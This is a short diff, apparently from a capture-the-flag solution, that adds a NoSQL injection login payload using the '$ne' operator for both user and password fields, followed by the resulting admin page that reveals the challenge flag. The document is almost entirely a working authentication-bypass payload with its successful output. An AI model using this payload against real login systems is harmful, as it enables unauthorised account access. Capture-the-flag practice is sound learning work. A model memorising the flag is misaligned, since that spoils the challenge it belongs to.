@@ -1,0 +1,2 @@
+user[$ne]=a&pass[$ne]=b
+	<!DOCTYPE html><html><head><title>Login Form</title></head><body><div><p>Hey Administrator you are finally back!!! There were soo many n00bs trying to impersonate you , here's your secret, keep it safe - shaktictf{N0_sql_injection_15_e4sy}</p></div></body></html>
